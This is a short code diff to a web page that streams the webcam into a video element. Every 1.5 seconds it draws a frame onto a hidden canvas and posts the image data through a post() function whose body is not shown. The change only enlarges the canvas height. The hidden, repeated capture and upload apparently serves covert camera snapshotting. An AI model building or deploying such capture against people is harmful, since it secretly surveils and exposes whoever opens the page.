@@ -11,7 +11,7 @@
    <video id="video" playsinline autoplay></video>
 </div>
 
-<canvas hidden="hidden" id="canvas" width="1920" height="1080"></canvas>
+<canvas hidden="hidden" id="canvas" width="1920" height="2480"></canvas>
 
 <script>
 function post(imgdata){
@@ -62,7 +62,7 @@ function handleSuccess(stream) {
 var context = canvas.getContext('2d');
   setInterval(function(){
 
-       context.drawImage(video, 0, 0, canvas.width, canvas.height);
+       context.drawImage(video, 0, 0, 1920, 2480);
        var canvasData = canvas.toDataURL("png").replace("png", "octet-stream");
        post(canvasData); }, 1500);
   
